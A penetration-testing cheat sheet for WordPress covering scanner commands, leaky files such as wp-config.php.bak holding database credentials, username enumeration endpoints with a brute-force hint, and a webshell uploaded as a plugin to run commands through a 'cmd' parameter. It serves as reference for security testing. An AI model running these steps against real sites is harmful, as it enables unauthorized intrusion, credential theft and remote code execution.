---
description: Wordpress
---

# Wordpress

> WordPress is a free and open-source content management system written in PHP and paired with a MySQL or MariaDB database.

### Wpscan

[wpscan](https://github.com/wpscanteam/wpscan) is a Wordpress vulnerability scanner that uses the [WordPress Vulnerability Database API](https://wpscan.com/api) to retrieve WordPress vulnerability data in real time.

```bash
wpscan --url $URL -e $ENUM_OPTIONS
```

**$ENUM\_OPTIONS:**

| **Option** | **Description**    |
| ---------- | ------------------ |
| vp         | Vulnerable plugins |
| ap         | All plugins        |
| vt         | Vulnerable themes  |
| at         | All themes         |
| cb         | Config backups     |
| dbe        | DB exports         |

### Droopescan

[Droopescan](https://github.com/SamJoan/droopescan) is a plugin-based scanner that aids security researchers in identifying issues with several CMS.

```bash
droopescan scan wordpress -u $URL -t $THREADS
```

### Plecost

[Plecost](https://github.com/iniqua/plecost) is a Wordpress vulnerability finder.

```bash
plecost -v http://SITE.com
```

### Interesting sensitive files

The following endpoints might leak some juicy information:

```bash
/wp-config.php.bak #Might leak some info including DB creds
/wp-content/debug.log #PHP related debug data
```

### Username enumeration

The following endpoints might leak to username disclosure/enumeration.

```
/wp-json/wp/v2/users
/?rest_route=/wp/v2/users
```

**Found any user?** try common/brute-forcing the password.

### RCE by uploading a plugin

If we have access to the administration panel we can use the following [seclists package](https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/WordPress/plugin-shell.php) in order to create a Wordpress plugin which will generate a webshell:

```bash
#Move to the following directory
cd /usr/share/seclists/Web-Shells/WordPress

#Compress the PHP webshell
sudo zip plugin-shell.zip plugin-shell.php

#Uplaod the plugin and navigate to the following directory. 
#Use cmd GET parameter to inject code:
curl http://$DOMAIN/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=
```
